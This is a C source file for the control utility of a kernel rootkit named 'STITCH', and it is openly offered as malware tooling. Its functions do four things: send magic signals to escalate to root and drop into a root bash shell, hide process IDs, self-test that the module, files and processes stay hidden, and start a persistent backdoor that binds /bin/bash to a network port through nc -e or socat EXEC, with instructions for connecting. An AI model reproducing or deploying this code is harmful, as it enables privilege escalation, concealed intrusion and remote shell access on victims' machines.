/*
 * STITCH Rootkit Control Utility
 * Userspace interface to control the kernel rootkit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define MAGIC_NUMBER 0x31337
#define SIG_ESCALATE 64
#define SIG_HIDE_PROC 63

void usage(const char *prog) {
    printf("STITCH Rootkit Control\n");
    printf("Usage: %s <command> [args]\n\n", prog);
    printf("Commands:\n");
    printf("  root              - Escalate to root privileges\n");
    printf("  hide <pid>        - Hide a process\n");
    printf("  test              - Run rootkit tests\n");
    printf("  backdoor <port>   - Open backdoor on port\n");
    printf("\n");
}

int escalate_to_root() {
    printf("[*] Attempting privilege escalation...\n");
    
    // Send magic signal
    if (kill(MAGIC_NUMBER, SIG_ESCALATE) < 0) {
        printf("[-] Failed to send signal (rootkit not loaded?)\n");
        return -1;
    }
    
    // Check if we're root
    if (getuid() == 0) {
        printf("[+] Successfully elevated to root!\n");
        printf("[+] UID: %d, EUID: %d\n", getuid(), geteuid());
        
        // Drop to shell
        printf("[*] Dropping to root shell...\n");
        system("/bin/bash");
        return 0;
    } else {
        printf("[-] Escalation failed\n");
        return -1;
    }
}

int hide_process(pid_t pid) {
    printf("[*] Hiding process %d...\n", pid);
    
    if (kill(pid, SIG_HIDE_PROC) < 0) {
        printf("[-] Failed to hide process\n");
        return -1;
    }
    
    printf("[+] Process %d hidden\n", pid);
    return 0;
}

int run_tests() {
    printf("[*] Running rootkit tests...\n\n");
    
    // Test 1: Check if rootkit is loaded
    printf("[TEST] Rootkit detection: ");
    FILE *fp = fopen("/proc/modules", "r");
    char line[256];
    int found = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "stitch_rootkit")) {
            found = 1;
            break;
        }
    }
    fclose(fp);
    
    if (!found) {
        printf("HIDDEN (good!)\n");
    } else {
        printf("VISIBLE (bad!)\n");
    }
    
    // Test 2: File hiding
    printf("[TEST] File hiding: ");
    system("touch /tmp/stitch_test.txt");
    system("ls /tmp/ | grep -q stitch_test && echo 'VISIBLE (bad!)' || echo 'HIDDEN (good!)'");
    
    // Test 3: Process hiding
    printf("[TEST] Process hiding: ");
    pid_t test_pid = fork();
    if (test_pid == 0) {
        // Child process
        sleep(10);
        exit(0);
    } else {
        // Parent - hide the child
        hide_process(test_pid);
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "ps aux | grep -q %d && echo 'VISIBLE (bad!)' || echo 'HIDDEN (good!)'", test_pid);
        system(cmd);
        kill(test_pid, SIGKILL);
    }
    
    return 0;
}

int open_backdoor(int port) {
    printf("[*] Opening backdoor on port %d...\n", port);
    
    // Create a simple backdoor listener
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
        "while true; do "
        "  nc -l -p %d -e /bin/bash 2>/dev/null || "
        "  socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash 2>/dev/null || "
        "  echo 'Backdoor failed - no nc/socat'; "
        "  sleep 1; "
        "done &", port, port);
    
    system(cmd);
    printf("[+] Backdoor listener started on port %d\n", port);
    printf("[*] Connect with: nc <target> %d\n", port);
    
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "root") == 0) {
        return escalate_to_root();
    }
    else if (strcmp(argv[1], "hide") == 0) {
        if (argc < 3) {
            printf("Usage: %s hide <pid>\n", argv[0]);
            return 1;
        }
        pid_t pid = atoi(argv[2]);
        return hide_process(pid);
    }
    else if (strcmp(argv[1], "test") == 0) {
        return run_tests();
    }
    else if (strcmp(argv[1], "backdoor") == 0) {
        int port = (argc > 2) ? atoi(argv[2]) : 31337;
        return open_backdoor(port);
    }
    else {
        printf("Unknown command: %s\n", argv[1]);
        usage(argv[0]);
        return 1;
    }
    
    return 0;
}